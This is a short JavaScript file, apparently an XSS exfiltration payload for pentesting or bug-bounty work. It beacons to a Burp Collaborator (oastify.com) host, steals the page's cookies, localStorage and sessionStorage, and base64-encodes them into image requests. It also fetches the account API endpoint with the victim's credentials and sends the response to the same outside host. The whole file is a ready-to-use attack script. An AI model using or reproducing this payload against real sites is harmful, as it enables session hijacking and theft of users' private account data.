// x.js
(function() {
    // Your Collaborator URL (replace with your active OAST domain)
    const EXFIL = 'https://5ntniidp3ig89awrjzjua398wz2qqhe6.oastify.com';

    // 1. Beacon – script executed
    new Image().src = EXFIL + '/exec?t=' + Date.now();

    // 2. Steal tokens
    const loot = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href
    };
    const lootB64 = btoa(unescape(encodeURIComponent(JSON.stringify(loot))));
    new Image().src = EXFIL + '/steal?data=' + lootB64;

    // 3. Fetch private account info
    fetch('/api/user/v1/account', {credentials: 'include'})
        .then(r => r.text())
        .then(body => {
            const acctB64 = btoa(unescape(encodeURIComponent(body)));
            new Image().src = EXFIL + '/account?data=' + acctB64;
        })
        .catch(() => new Image().src = EXFIL + '/account-fail');
})();
